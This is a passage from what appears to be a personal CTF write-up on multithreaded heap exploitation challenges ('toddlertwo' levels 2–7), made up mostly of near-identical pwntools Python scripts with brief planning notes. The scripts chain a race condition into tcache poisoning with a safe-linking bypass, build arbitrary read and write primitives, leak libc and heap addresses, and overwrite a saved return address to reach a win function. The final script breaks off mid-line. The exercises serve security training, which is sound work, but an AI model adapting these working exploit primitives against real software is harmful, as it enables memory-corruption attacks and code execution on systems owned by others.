class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1778</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level3-5"><a href="#level3-5" class="headerlink" title="level3"></a>level3</h4><p>a hint from the code:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fwrite(<span class="hljs-string">&quot;Storing the secret in this thread&#x27;s stack.\n&quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x2B</span>uLL, (FILE *)__readfsqword(<span class="hljs-number">0xFFFFFFF8</span>));<br>load_secret(&amp;v5);<br></code></pre></div></td></tr></table></figure><p>so it’s quite easy, just need to locate the challenge’s frame base. </p><p>the stored_rip_addr is at a constant offset from the challenge’s frame base.</p><h4 id="level4-6"><a href="#level4-6" class="headerlink" title="level4"></a>level4</h4><p>nothing special</p><h4 id="level5-7"><a href="#level5-7" class="headerlink" title="level5"></a>level5</h4><p>Storing the secret in the environment by <code>setenv()</code>. env is pointed by the <code>environ</code> in libc. i need to have a look at that blog to learn how to dig into ld library. let me add a new section in key points.</p><p>distance libc_base ld_base = 0x1df000 bytes. the secret is stored in the <strong>main thread heap</strong>. </p><p><strong>plan:</strong> </p><blockquote><p>wrong start:</p><ul><li><del>at first read out of the <strong>binary base</strong>(in kali the only way i can is cheat…)</del></li><li><del>locating the env string in heap. read out of it.</del></li></ul></blockquote><ul><li>after read out the main_arena’s base, read out the <code>top</code> field content, which is the top chunk of the main thread near the binary. it won’t change when child threads receiving and processing commands.</li><li>next locate the distance between the top_chunk and secret’s address. this is also a constant.</li><li>read out the secret.</li><li>then use <code>send_flag</code> command.</li><li><del>or just change the return address of challenge.</del> </li></ul><p>exp(the second method):</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1798</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level6-7"><a href="#level6-7" class="headerlink" title="level6"></a>level6</h4><p>Storing the secret in the main thread’s heap.</p><p>what the difference with the previous one?</p><h4 id="level7-6"><a href="#level7-6" class="headerlink" title="level7"></a>level7</h4><p>there is no send_flag command and win() function. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span 